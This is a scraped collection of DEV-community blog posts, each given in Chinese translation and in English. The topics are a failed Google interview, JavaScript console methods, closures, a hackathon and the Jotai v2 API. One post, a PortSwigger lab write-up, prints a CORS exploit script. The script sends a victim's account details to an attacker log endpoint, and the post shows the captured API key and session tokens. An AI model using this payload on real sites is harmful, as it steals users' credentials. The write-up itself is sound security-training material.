item.title: 讨论我的谷歌面试过程[跟进] | Discussing my interview process for Google [Follow Up]
item.description:
注意：这篇文章已经在我的草稿中放置了大约一周左右，因为这个过程需要很长时间。

对于面试过程的含糊不清，我深表歉意。 我不确定他们在讨论面试过程中涉及的主题时有什么样的规则，我不想冒险。

这是我讨论面试过程的后续帖子。

好吧，自从我在 Google 接受数据中心技术人员 1 的面试以来已经过去了大约 3 周，结果已经......我会在几秒钟内找到他们，我只想先谈谈一些事情。

首先是等待。 没办法。 这是面试过程的一部分。 你进行面试，然后等着看你是否得到了这份工作。 在这种情况下，我在一个奇怪的时间接受了采访。 我的面试是在 11 月 14 日的一个星期一举行的。 通常，或者至少根据我在这家特定公司的经验，有时他们可能需要一段时间才能回复您。 我没想到第一周会听到任何消息，因为我知道他们必须有时间评估我、我的技能并查看我的简历。 接下来的一周是感恩节。 那时我绝对没想到会听到任何消息，因为那是感恩节那一周。 对我们来说，这是一个短短的 3 天工作周，我的招聘人员整整一周都不在办公室。 所以我猜想我会在本周或下周的某个时候听到任何消息。

今天上班时，我决定联系我的招聘人员，查看我的面试状态。 我的招聘人员告诉我他明天会打电话给我，因为他必须和我谈谈。 我不确定这意味着什么，但我们拭目以待。

第二天：

他说我可能会再接受 1 次面试，具体取决于招聘经理是否想继续。 他说大约一周后我才能知道我的申请结果。 如果招聘经理想继续，我会再接受 1 次面试，然后，如果我通过了那次面试，我的申请将被发送到招聘委员会进行审查。 如果他们也同意，我就会得到这份工作。 所以，我们再看看会发生什么。

他还告诉我，由于我的面试进行得如何，他不愿意将我的申请发送给我面试的 (L2) 职位。 他告诉我，如果我仍然感兴趣，我可以去 L1 职位。

我肯定地告诉他。 我的意思是，工作就是工作，在我面试之后，我已经有点想到会发生这种情况。 更不用说，鉴于我目前的技能组合，我更愿意以 L1 的身份进入并做一段时间，直到我能够发展出进入 L2 职位所需的必要技能。

所以现在，更多的等待......

一周后...

所以，到星期二我还没有听到任何消息，所以我决定再次联系我的招聘人员。 他说他仍在等待招聘经理与他联系，但无论如何他会在第二天下午 1 点安排与我通电话。 我想回顾一下一切，看看我是否有任何问题。

最终判决：

我今天去上班，他在 1:20 左右打电话给我。 这个消息……不好。 他告诉我，根据我的面试情况，招聘经理此时不想继续我的面试。 他向我道歉并问我是否有任何问题要问他。 我告诉他不，他给了我一些关于我可以学习什么以提高下次机会的建议，仅此而已。

他说他会将我的申请状态保留为“开放”，看看是否还有其他我们感兴趣的 HM，仅此而已。

因此，如果有机会在不同地点的另一位 HM 感兴趣，我会再进行 1 次面试，然后将其发送给招聘委员会。

最后的想法和感受：

我现在感觉太多了，把所有的东西都写在一篇文章里有点让人不知所措，所以我只是想自由地表达它，直到我涵盖最重要的主题。 我只想在下一节的序言中说，这绝不是一个可怜的聚会，也不是我为自己感到难过。 我只是在通话两小时后表达我现在的感受。

我很难过：显然，首先，我很沮丧我没有得到它。 我觉得我的努力没有意义。 我不喜欢自责，我觉得我对计算机或它们的工作原理一无所知。 这次的面试过程对我来说是残酷的。 我真的很紧张，我什至努力坚持到面试结束。

我很生气：不是对我的招聘人员或公司，而是对我自己。 因为我有自暴自弃的倾向，我会因为很多不同的原因生自己的气。 因为我学习不够（尽管我努力学习了几个月）我没有做好足够的准备（不太确定如何避免这种感觉）。 因为我觉得自己不够努力（尽管我已经尽力了。

我被打败了：因为一切都还那么新鲜和生涩，放弃和不再申请的念头闪过我的脑海。 一旦我有时间处理所有事情并回顾它，我将重新评估所有事情，但现在，我不能 100% 确定我是否想再次申请。

冒名顶替综合症：这可能是我想到的第二件事。 我觉得我完全不合适，而且在错误的领域。 我之前说过，但我会再说一遍：这次面试过程很残酷。 这真的让我质疑自己以及我对这份工作的了解。

有很多感觉和情绪在我脑海中闪过，我想我只需要花时间反思一切，并在以后重新审视这整件事。
不过还不全是坏事。

黄金三镖客：

这并不是说一切都不好。 我喜欢我现在的工作，我学到了很多东西。 我会尽我所能继续在那里工作，并尽可能多地学习。

这整个过程既不是完全好的也不是完全坏的。 我学到了很多东西，我知道如果我决定再次申请这个职位，我需要改进什么。

我想花点时间反思一下，然后开始朝着我的下一个目标努力。 无论是试图获得全职数据中心职位，还是继续我的全栈开发学习。 我会一天一天地弄清楚。

关于这一点真的没什么好说的。 非常感谢您的阅读，希望您度过一个美好的白天/夜晚！



原文:

NOTE: This is article has been sitting in my drafts for about a week or so now due to the process taking so long.

I apologize for the vagueness about the interview process. I'm not sure what kind of rules they have about discussing the topics covered during the interview process and I don't want to take any chances.

This is the follow up post to my Discussing my interview process.

Well, it's been about 3 weeks since I had my interview for a data center technician 1 at Google and the results are in...and I'll get to them in a sec, I just want to talk about a few things first.

Firstly, the waiting. It can't be helped. That is part of the interview process. You do your interview and then you wait to see if you got the job. In this case, I had my interview at a weird time. My interview was held on November 14th on a Monday. Normally, or at least in my experience with this particular company, sometimes it can take them a while to get back to you. I wasn't expecting to hear anything the first week because I knew they had to have time to evaluate me, my skillset and to look at me resume. The following week, was Thanksgiving. I definitely didn't expect to hear anything back then because it was the week of Thanksgiving. It was a short 3 day work week for us and my recruiter was out of office for that entire week. So I had a guess that it would be sometime this week or next week before I heard anything.

While at work today, I decided to reach out to my recruiter and check on the status of my interview. My recruiter told me that he would call me tomorrow because he had to talk to me. I'm not sure what that means but, we'll see.

The next day:

He said that I could potentially have 1 more interview depending on if the hiring manager manager wanted to continue. He said it would be around a week before I knew where my application stood. If the hiring manager wants to continue, I'll get 1 more interview and then, if I make it past that interview, my application will get sent to a hiring committee that will review it. If they also say yes, I will get the job. So again, we'll see what happens.

He also told me that, due to how my interview went, he wasn't comfortable with sending my application through for the position I interviewed for (L2). He told me I could go for an L1 position of I was still interested.

I told him sure. I mean, a job is a job and after my interview, I already kind of figured that's what would happen. Not to mention, given my current skill set, I was way more comfortable going in as an L1 and doing that for a while until I could develop the necessary skills I needed to go to the L2 position.

So now, more waiting...

One Week Later...

So, I hadnt heard anything by Tuesday so I decided to reach out to my recruiter again. He said that he was still waiting on the hiring manager to get back with him but he would schedule a phone call with me the next day at 1pm anyway. I guess to go back over everything and see if I had any questions.

The final verdict:

I get to work today and around 1:20 he calls me. The news was...not good. He told me that, based off how my interview went, the hiring manager did not want to move forward with my interview at this time. He apologized and asked me if I had any questions for him. I told him no and he gave me some advice on what I could study to improve my chances the next time and that was it.

He said he'd leave my application status as "open" and see if any other HM's we're interested and that was about it.

So, if by some chance another HM at a different site is interested, I would have 1 more interview and then have that sent off to the hiring committee.

Final thoughts and feelings:

I am feeling so many things right now that it is a bit overwhelming to get it all in a post so I'm just gonna free form it until I cover the most important topics. I just want to preface this next section and say that this is in no way a pitty party or me feeling sorry for myself. I'm just expressing how I feel right now two hours after the call.

I'm sad: Obviously, first and foremost, I'm upset I didn't get it. I feel like my efforts didn't matter. I'm bad about beating myself up and I feel like I don't know anything about computers or how they work. The interview process this time around was BRUTAL for me. My nerves really got the best of me and I struggled to even make it to the end of the interview.

I'm mad: not at my recruiter or the company but at myself. Because I have a tendency to beat myself up, I'm mad at myself because of so many different reasons. Because I didn't study enough (even though I studied diligently for months) I wasn't prepared enough (Not really sure how to avoid that feeling). Because I feel like I didn't try hard enough (even though I did the best I could.

I'm defeated: Because everything is still so fresh and raw, the thought of giving up and not applying again crossed my mind. I'm gonna reevaluate everything once I've had time to process it all and look back on it but, right now, I'm not 100% sure if I want to apply again.

Imposter syndrome: That is probably the second thing that crossed my mind. I felt like I was completely out of place and in the wrong field. I've said it earlier but I'll say it again: the interview process was BRUTAL this time around. It really made me question myself and what I knew about the job.

There are just a lot of feelings and emotions rushing through my head and I think I just need to take time to reflect on everything and revisit this whole thing at a later date.
It's not all bad though.

The Good, The Bad, and The Ugly:

None of this is to say that it's all bad. I love my current job and I have learned a lot. I'll continue to work there for as long as I can and try to learn as much as I can.

This whole process has been neither completely good or completely bad. I have learned a lot and I know what I need to improve upon if I decide to apply for the position again.

I want to take some time and reflect on it and then start working towards my next goal. Whether that be trying to get the full time data center position or continuing my studies in full stack development. I'll figure it out one day at a time.

There's not really much else to say about this. I want to thank you so much for reading and hope you have a wonderful day/night!
item.author: kurtissfrost

item.title: 为什么在 2023 年只使用 console.log 是一个大禁忌🚀 | Why using just console.log in 2023 is a big no-no 🚀
item.description:
这里有 5 个必须知道的控制台对象方法和技巧！

在 2023 年，您是否仍在使用console.log来满足所有 JavaScript 调试需求？

是时候提升您的技能并发现 JavaScript 控制台对象的全部功能了。

从console.table到console.time ，这些高级方法和技巧将帮助您提高调试输出的质量和可读性，并更轻松地排除和修复代码中的问题。

那么为什么不在 2023 年加入 JavaScript 忍者调试器的行列，学习这些基本技术呢？ 你的代码会感谢你。

仅使用console.log的最大问题之一是它会使您的代码混乱并且难以阅读。 此外，它本身的信息量不是很大。 它只是输出你传递给它的任何值，没有任何上下文或附加信息。

考虑到这一点，这里有十个你应该知道的 JavaScript 控制台对象方法和技巧（并尝试一下；我知道只使用 console.log 会更快，但它可以让你的调试体验更好，为你的未来自己！ ）。

此方法允许您以可读且易于理解的格式输出表格数据。 这将以表格格式输出users数组，每个对象的属性作为列，对象作为行。

这些方法允许您在控制台中创建一个嵌套的、可折叠的组。 这对于组织和构建调试输出非常有用，因此您可以轻松地查看代码的不同级别发生了什么。

 console.group('User Details'); console.log('Name: John Doe'); console.log('Age: 32'); console.groupEnd();

这将在控制台中创建一个嵌套的、可折叠的组，标题为“用户详细信息”。 组内的日志消息将缩进并组合在一起。

这些方法允许您测量执行一段代码所花费的时间。 这对于识别代码中的性能瓶颈并对其进行优化很有用。

 console.time('Fetching data'); fetch('https://reqres.in/api/users') .then(response => response.json()) .then(data => { console.timeEnd('Fetching data'); // Process the data });

这将测量从指定 URL 获取数据并解析 JSON 响应所花费的时间。 经过的时间将在控制台中输出。

此方法允许您在代码中编写断言，这些断言应该始终为真。 如果断言失败， console.assert将在控制台中输出一条错误消息。 这对于捕获错误和确保您的代码按预期工作很有用。

 function add(a, b) { return a + b; } // Test the add function const result = add(2, 3); console.assert(result === 5, 'Expected 2 + 3 = 5');

如果在给定输入 2 和 3 时add函数未返回预期结果 5，这将在控制台中输出一条错误消息。

使用console对象输出样式和颜色。 您可以在console.log语句中使用%c占位符来指定输出文本的 CSS 样式。

 console.log('%cHello world!', 'color: red; font-weight: bold;');

这将输出文本“Hello world!” 以红色和粗体显示，使用指定的 CSS 样式。

顺便说一句，如果你想要更好的日志，你可能想要使用一个专门的日志库，它提供了更多的设置。 我在我写的这篇文章中添加了一个非常好的： https ://dev.to/naubit/5-small-and-hidden-react-libraries-you-should-already-be-using-nb5

使用console.trace方法输出堆栈跟踪。 这对于理解代码中的执行流程和识别特定日志消息的来源很有用。

 function foo() { console.trace(); } function bar() { foo(); } bar();

这将在控制台中输出堆栈跟踪，显示导致console.trace调用的函数调用序列。 输出看起来像这样：

使用console.dir方法以分层格式输出对象的属性。 这对于探索对象的结构以及查看其所有属性和方法很有用。

 const obj = { id: 1, name: 'John Doe', address: { street: '123 Main St', city: 'New York', zip: 10001 } }; console.dir(obj);

这将以分层格式输出obj对象的属性，允许您查看对象的结构及其所有属性和值。

使用console.count方法统计特定日志消息的输出次数。 这对于跟踪特定代码路径的执行次数以及识别代码中的热点非常有用。

 function foo(x) { console.count(x); } foo('hello'); foo('world'); foo('hello');

这将在控制台中输出字符串“hello”，然后是数字 1。然后它将在控制台中输出字符串“world”，然后是数字 1。最后，它会再次输出字符串“hello”，然后是按数字 2（因为它已被调用两次）。

使用console.clear方法清除控制台输出。 这对于保持您的调试输出井井有条和整洁以及更容易专注于您感兴趣的信息很有用。

 console.log('Hello world!'); console.clear(); console.log('This log message will appear after the console is cleared.');

这将输出字符串“Hello world!” 在控制台中，后跟一个空行（因为控制台已清除）。 然后它会输出字符串“This log message will appear after the console is cleared.”

使用console.profile和console.profileEnd方法来衡量代码块的性能。 这对于识别性能瓶颈和优化代码以提高速度和效率非常有用。

 console.profile('MyProfile'); // Run some code that you want to measure the performance of for (let i = 0; i < 100000; i++) { // Do something } console.profileEnd('MyProfile');

这将开始分析console.profile和console.profileEnd调用之间的代码块，并在执行console.profileEnd调用时在控制台中输出结果。 输出将包括有关执行代码所花费时间的详细信息以及任何其他与性能相关的信息。

在 2023 年，不要console.log - JavaScript 控制台对象中有许多更强大、更有价值的工具和技术可用。

从console.table到console.time ，这些方法和技巧将帮助您提高调试输出的质量和可读性，并使您更容易排查和修复代码中的问题。

那么，为什么不在 2023 年提高您的调试技能并尝试这些技术呢？ 你的代码（和你的理智）会感谢你。

哦，还有……

🌎 Let's Connect! 🌎 让我们联系起来！



原文:

Here are 5 must-know console object methods and tricks!

Are you still using console.log for all your JavaScript debugging needs in 2023?

It's time to upgrade your skills and discover the full power of the JavaScript console object.

From console.table to console.time, these advanced methods and tricks will help you improve the quality and readability of your debug output and make it easier to troubleshoot and fix problems in your code.

So why not join the ranks of the JavaScript ninja debuggers in 2023, and learn these essential techniques? Your code will thank you.

😞 The problem

One of the biggest problems with using just console.log is that it can clutter up your code and make it difficult to read. Additionally, it's not very informative on its own. It just outputs the value of whatever you pass to it without any context or additional information.

With that in mind, here are ten JavaScript console object methods and tricks you should know about (and give them a try; I know it is faster to just console.log, but it can make your debugging experience way better, do it for your future yourself!).

1️⃣ console.table

This method allows you to output tabular data in a readable and easy-to-understand format. Instead of just logging out an array or object, console.table will display the data in a tabular format, which makes it easier to scan and understand.

// Output an array of objects as a table
const users = [
  { id: 1, name: 'John Doe' },
  { id: 2, name: 'Jane Doe' }
];
console.table(users);

This will output the users array in a tabular format, with the properties of each object as columns and the objects as rows.

2️⃣console.group

console.group and console.groupEnd. These methods allow you to create a nested, collapsible group in the console. This can be useful for organizing and structuring your debug output, so you can easily see what's happening at different levels of your code.

console.group('User Details');
console.log('Name: John Doe');
console.log('Age: 32');
console.groupEnd();

This will create a nested, collapsible group in the console with the heading “User Details.” The log messages inside the group will be indented and grouped together.

3️⃣console.time

console.time and console.timeEnd. These methods allow you to measure the amount of time it takes for a block of code to execute. This can be useful for identifying performance bottlenecks in your code and optimizing them.

console.time('Fetching data');
fetch('https://reqres.in/api/users')
  .then(response => response.json())
  .then(data => {
    console.timeEnd('Fetching data');
    // Process the data
  });

This will measure the amount of time it takes to fetch data from the specified URL and parse the JSON response. The elapsed time will be output in the console.

4️⃣console.assert

This method allows you to write assertions in your code, which are statements that should always be true. If an assertion fails, console.assert will output an error message in the console. This can be useful for catching bugs and ensuring your code is working as expected.

function add(a, b) {
  return a + b;
}

// Test the add function
const result = add(2, 3);
console.assert(result === 5, 'Expected 2 + 3 = 5');

This will output an error message in the console if the add function does not return the expected result of 5 when given the input 2 and 3.

5️⃣Style your logs

Use the console object to output styles and colors. The console object allows you to output text in different colors and styles, making your debug output more readable and easier to understand.

You can use the %c placeholder in your console.log statements to specify a CSS style for the output text.

console.log('%cHello world!', 'color: red; font-weight: bold;');

This will output the text “Hello world!” in red and bold, using the specified CSS style.

By the way, if you want even better logs, you might want to use a specialized logging library, which offers more settings. I added a really good one in this article I wrote: https://dev.to/naubit/5-small-and-hidden-react-libraries-you-should-already-be-using-nb5

6️⃣console.trace

Use the console.trace method to output a stack trace. This can be useful for understanding the flow of execution in your code and for identifying where a particular log message is coming from.

function foo() {
  console.trace();
}

function bar() {
  foo();
}

bar();

This will output a stack trace in the console, showing the sequence of function calls leading up to the console.trace call. The output will look something like this:

7️⃣console.dir

Use the console.dir method to output the properties of an object in a hierarchical format. This can be useful for exploring the structure of an object and for seeing all of its properties and methods.

const obj = {
  id: 1,
  name: 'John Doe',
  address: {
    street: '123 Main St',
    city: 'New York',
    zip: 10001
  }
};
console.dir(obj);

This will output the properties of the obj object in a hierarchical format, allowing you to see the structure of the object and all of its properties and values.

8️⃣console.count

Use the console.count method to count the number of times a specific log message is an output. This can be useful for keeping track of how many times a particular code path is executed and for identifying hot spots in your code.

function foo(x) {
  console.count(x);
}

foo('hello');
foo('world');
foo('hello');

This will output the string “hello” in the console, followed by the number 1. It will then output the string “world” in the console, followed by the number 1. Finally, it will output the string “hello” again, followed by the number 2 (since it has been called twice).

9️⃣console.clear

Use the console.clear method to clear the console output. This can be useful for keeping your debug output organized and uncluttered and for making it easier to focus on the information you're interested in.

console.log('Hello world!');
console.clear();
console.log('This log message will appear after the console is cleared.');

This will output the string “Hello world!” in the console, followed by a blank line (since the console is cleared). It will then output the string “This log message will appear after the console is cleared.”

1️⃣0️⃣console.profile

Use the console.profile and console.profileEnd methods to measure the performance of a block of code. This can be useful for identifying performance bottlenecks and for optimizing your code for speed and efficiency.

console.profile('MyProfile');

// Run some code that you want to measure the performance of
for (let i = 0; i < 100000; i++) {
  // Do something
}

console.profileEnd('MyProfile');

This will start profiling the block of code between the console.profile and console.profileEnd calls and will output the results in the console when the console.profileEnd call is executed. The output will include details about the amount of time it took to execute the code and any other performance-related information.

💭 Some final thoughts

In 2023, don’t just settle for console.log - there are many more powerful and valuable tools and techniques available in the JavaScript console object.

From console.table to console.time, these methods and tricks will help you improve the quality and readability of your debug output, and make it easier to troubleshoot and fix problems in your code.

So why not level up your debugging skills in 2023 and give these techniques a try? Your code (and your sanity) will thank you.

Oh, and…

🌎 Let’s Connect!
item.author: naubit

item.title: Portswigger 的实验室文章：具有基本原点反射的 CORS 漏洞 | Portswigger’s lab write up: CORS vulnerability with basic origin reflection
item.description:
克里斯蒂安·佩斯

发表于在此学徒级实验室中，我们将利用具有基本 CORS 漏洞的网站来获取用户的私人凭据。

使用给定的凭据登录后，我们访问帐户详细信息页面并检查对/accountDetails请求的响应标头，该请求获取用户的 API 密钥：

 HTTP/1.1 200 OK Access-Control-Allow-Credentials: true Content-Type: application/json; charset=utf-8 Connection: close Content-Length: 149 { "username": "wiener", "email": "", "apikey": "JQ7ufLKKzNoI4ahWKAKWBG5eP64wgwJW", "sessions": [ "cdmflpOO6psYIp3novWUytbSDM9i68X1" ] }

我们可以看到Access-Control-Allow-Credentials: true存在，让我们尝试复制此请求并将 Origin 标头更改为Origin: https://example.com之类的内容，看看是否反映了此值，结果响应将是这样的：

 HTTP/1.1 200 OK Access-Control-Allow-Origin: <https://example.com> Access-Control-Allow-Credentials: true Content-Type: application/json; charset=utf-8 Connection: close Content-Length: 149 { "username": "wiener", "email": "", "apikey": "JQ7ufLKKzNoI4ahWKAKWBG5eP64wgwJW", "sessions": [ "cdmflpOO6psYIp3novWUytbSDM9i68X1" ] }

请求标头中设置的 Origin 出现在Access-Control-Allow-Origin响应标头中，这证实了该请求存在 CORS 漏洞，让我们使用阅读材料的模板来制作我们的漏洞：

 var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','<https://vulnerable-website.com/sensitive-victim-data>',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+encodeURIComponent(this.responseText); };

我们必须修改 exploit 以包含易受攻击的网站的/accountDetails端点和我们的 exploit 服务器/log端点，在将代码包含在<script>标记中之后，最终的 exploit 将如下所示：

 <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','${LAB_URL}/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='{$EXPLOIT_SERVER_URL}/log?key='+encodeURIComponent(this.responseText); }; </script>

将这个漏洞发送给我们的受害者后，我们可以在我们的漏洞利用服务器日志中读取他们的凭据：

 181.63.62.250 2022-12-07 03:10:36 +0000 "GET /log?key=%7B%0A%20%20%22username%22%3A%20%22wiener%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22OiwIQ3xcR32ilUvyyai9tSWuUnzjfrzp%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%228QJ2k8dqE1vVtNcHmZixScfFPDENAzvo%22%2C%0A%20%20%20%20%22JNIc4VJZlskPdwjcf2C0fAREYXnaNATt%22%0A%20%20%5D%0A%7D HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"

查看这篇关于代码艺术的文章： https ://artofcode.tech/portswiggers-lab-write-up-cors-vulnerability-with-basic-origin-reflection/

前往我们的欢迎帖，向我们介绍一下您自己！

一旦暂停，christianpaez 将无法发表评论或发布帖子，直到他们的暂停被删除。

解除暂停后，christianpaez 将能够再次发表评论和发布帖子。

一旦取消发布，christianpaez 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 christianpaez 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

报告其他不当行为

不屈不挠的 christianpaez 将恢复他们帖子的默认可见性。



原文:

Christian Paez

Posted on Dec 8

In this apprentice-level lab, we will exploit a website with a basic CORS vulnerability to obtain a user's private credentials.

Upon logging in with the given credentials, we visit the account details page and check the response headers of the request to /accountDetails that fetches the user's API key:

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "JQ7ufLKKzNoI4ahWKAKWBG5eP64wgwJW",
  "sessions": [
    "cdmflpOO6psYIp3novWUytbSDM9i68X1"
  ]
}

We can see that the Access-Control-Allow-Credentials: true is present, let's try to duplicate this request and change the Origin header to something like Origin: https://example.com and see if this value is reflected, the resulting response will be something like this:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: <https://example.com>
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "JQ7ufLKKzNoI4ahWKAKWBG5eP64wgwJW",
  "sessions": [
    "cdmflpOO6psYIp3novWUytbSDM9i68X1"
  ]
}

The Origin set in the request headers is present in the Access-Control-Allow-Origin response headers, this confirms us that this request has a CORS vulnerability, let's use the reading material's template to craft our exploit:

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','<https://vulnerable-website.com/sensitive-victim-data>',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+encodeURIComponent(this.responseText);
};

We have to modify out exploit to include the vulnerable website's /accountDetails endpoint and our exploit server /log endpoint, after including the code in a <script> tag the final exploit will look like this:

<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','${LAB_URL}/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='{$EXPLOIT_SERVER_URL}/log?key='+encodeURIComponent(this.responseText);
};
</script>

After sending this exploit to our victim we can read their credentials in our exploit server logs:

181.63.62.250   2022-12-07 03:10:36 +0000 "GET /log?key=%7B%0A%20%20%22username%22%3A%20%22wiener%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22OiwIQ3xcR32ilUvyyai9tSWuUnzjfrzp%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%228QJ2k8dqE1vVtNcHmZixScfFPDENAzvo%22%2C%0A%20%20%20%20%22JNIc4VJZlskPdwjcf2C0fAREYXnaNATt%22%0A%20%20%5D%0A%7D HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"

Check out this write up on the Art Of Code: https://artofcode.tech/portswiggers-lab-write-up-cors-vulnerability-with-basic-origin-reflection/

Github: https://github.com/christianpaez/portswigger/tree/main/labs/apprentice/cors/cors-vulnerability-with-basic-origin-reflection

Head over to our Welcome Thread and tell us a bit about yourself!

item.title: 在一个简单的程序中解释 JavaScript 闭包。 3 minute read. 3分钟阅读。 | Explaining JavaScript closures in one simple program. 3 minute read.
item.description:
吉奥穆卡斯

发表于闭包只不过是函数加上它的词法范围。

让我们看一个例子来理解闭包。

 function outer (){ let a = 5 ; function inner (){ console . log ( ' inner ' , a ); } inner (); } outer (); //prints 'inner', 5

这里我们有一个叫做 outer 的函数。

我们有一个名为“inner”的内部函数，它使用变量 a 简单地记录 inner。
变量 a 在内部函数外声明。

我们在外部函数内部调用内部。

当我们调用外部函数时，它只是打印日志。 很简单。

我修改了下面的代码。 现在想想答案。

 function outer (){ let a = 5 function inner (){ console . log ( ' inner ' , a ); } return inner ; } let y = outer (); y ();

它打印完全相同的东西。

我已经声明了一个存储外部函数的变量 y，稍后我调用 y。 在这里，当我返回 inner 时，存储在变量 y 中的值只能是 inner。

它是如何记住 a 的？ 这称为关闭。 克里斯蒂安费尔南多 - 一旦暂停，geomukkath 将无法发表评论或发布帖子，直到他们的暂停被删除。

解除暂停后，geomukkath 将能够再次发表评论和发布帖子。

一旦取消发布，geomukkath 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 geomukkath 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 您可以通过以下方式标记 geomukkath：

报告其他不当行为

取消标记 geomukkath 将恢复其帖子的默认可见性。



原文:

Geo Mukkath

Posted on Dec 8

Closures are nothing but functions plus it’s lexical scope.

Let’s look at an example to understand closures.

function outer(){ let a = 5; function inner(){ console.log('inner', a); } inner();
} outer(); //prints 'inner', 5

Here we have a function called outer.

We have an inner function called ‘inner’ which simply logs inner with a variable a.
The variable a is declared outside the inner function.

We call inner inside the outer function.

When we call the outer function it simply prints the log. That’s simple.

I’ve modified the code below. Now think of an answer.

function outer(){ let a = 5 function inner(){ console.log('inner', a); } return inner;
} let y = outer(); y();

It prints the exact same thing.

I have declared a variable y which stores the outer function and I call y later. Here when I return inner, the value that get stored in the variable y must only be inner.

How does it remember a ? a is outside inner, despite that it remembers a.

This is called closure. The closure of inner is the function itself + its lexical scope.

☝️ Check out this all-time classic DEV post

Atharva Shankar Avhad - Dec 4

Cristian Fernando - Dec 6

Once unsuspended, geomukkath will be able to comment and publish posts again.

If geomukkath is not suspended, they can still re-publish their posts from their dashboard.

item.description:
多米尼克沙漠

发表于在我的上一篇文章中，我提到我创建了一个博客，以及我是如何致力于分享想法的。 我仍在致力于 idea sharer，但我也决定参加两个高中黑客马拉松。 我决定这样做是因为我想建立我的简历并应用我的知识。 对于这个项目，我打算使用一种我以前没有用过的语言，React Native。 我喜欢 React Native 是跨平台的，黑客马拉松是一个学习网络开发的机会。

我今天开始为 React Native 设置我的笔记本电脑并阅读文档。

Dominique Desert

Posted on Dec 8

In my last post, I mentioned that I created a blog and how I was working on an idea sharer. I am still working on idea sharer, but I also decided to join two high school hackathons. I decided to do so because I want to build my resume and apply my knowledge. For this project, I plan to use a language I haven't used before, React Native. I love how React Native is cross-platform and the hackathon is an opportunity to learn about web development.

I started today by setting up my laptop for React Native and reading documentation.

item.title: 为什么我们需要 Jotai v2 API | Why We Need Jotai v2 API
item.description:
这是什么意思？ 首先，在 React 的渲染阶段评估原子读取功能。

例如，考虑一个简单的派生原子。

 const countAtom = atom ( 0 ); const doubleAtom = atom (( get ) => get ( countAtom ) * 2 );

在示例中， (get) => get(countAtom) * 2是读取函数。 更新countAtom时，库不会立即调用doubleAtom的读取函数。 相反，它会触发使用doubleAtom的组件重新渲染。 组件最终会重新呈现，并且是在调用doubleAtom的 read 函数时。 这种行为的好处可能是假设的，但 React 允许安排重新渲染，这意味着它可以跳过并发渲染中调用读取函数。

例如，让我们看一个例子。

 const countAtom = atom ( 0 ); const asyncAtom = atom ( async ( get ) => { const isEven = get ( countAtom ) % 2 === 0 ; await someAsyncFunction (); return isEven ; }); const derivedAtom = atom (( get ) => { const isEven = get ( asyncAtom ); return isEven ? " even " : " odd " ; });

这可能有点复杂。 第一个原子是原始原子，第二个原子是依赖于第一个原子的异步原子，第三个原子是依赖于第二个“异步”原子的“同步”原子。

当更改countAtom并调用derivedAtom的读取函数时，将评估asyncAtom的读取函数，并且它会暂停，因为它返回一个承诺。 当 promise 被 resolve 时， asyncAtom有一个 resolved 值，Jotai 库重新评估derivedAtom的 read 函数。

当countAtom值增加 2 时， derivedAtom的读取函数可能会返回相同的值。 在这种情况下，渲染会退出并且不会对 DOM 进行更改。

这基本上就是 v1 API 的设计方式。 自最初发布以来已经有一段时间了，事实证明 v1 API 有一些限制。

两大问题

如前所述，评估读取功能是有意的，但行为有点难以理解。 考虑以下示例： 

 const countAtom = atom ( 0 ); const derivedAtom = atom (( get ) => { const isEven = get ( countAtom ); return isEven ? " even " : " odd " ; });

当countAtom值增加 2 时， derivedAtom的 read 函数被重新计算，但它返回的值与之前相同。 在 React 17 中，由于useReducer中的早期 bail out 而无法观察到。

在 React 18 中， useReducer行为发生了变化，它不会提前退出。 这对 Jotai 库来说是件好事，因为我们想延迟读取函数的评估。 然而，这种行为让很多开发者感到很困惑，因为人们经常使用console.log来调试渲染行为。

另请参阅此推文中的示例。

我们称这种行为为“没有提交的额外重新渲染”，
这是设计的预期行为。 如果这种行为会导致大量计算，我们可以使用useMemo来避免它。 但是，无论如何，这令人困惑。

另一个问题是商店 API。 我们在 v1 API 中有一个内部存储 API，我们尝试通过unstable_createStore将其公开用于更多用例。 它的困难在于异步原子。 我们不能公开“暂停和重播”行为，因为它不是很容易理解。

 const store = unstable_createStore (); const countAtom = atom ( 0 ); const asyncAtom = atom ( async ( get ) => { await new Promise (( r ) => setTimeout ( r , 1000 )); return get ( countAtom ); }); store . get ( asyncAtom ); // returns `undefined` while asyncAtom is pending. store . getAsync ( countAtom ); // returns a promise even though countAtom is not async.

假设不可能提供更好的 API，因为我们无法区分原子是否会挂起。 同时，React 团队打开了一个新的 RFC，其中包含一个名为use的新钩子。

在撰写本文时，该 RFC 尚未最终确定，但足以让我们重新考虑 Jotai API。 新的use钩子可以解决具有挂起和重播行为的承诺，就像我们之前可以抛出一个承诺一样。
但是，它不允许在任何地方use 。 您只能在其他挂钩中use 。 这意味着在 Jotai 库中完成的暂停和重播行为不能用use代替。

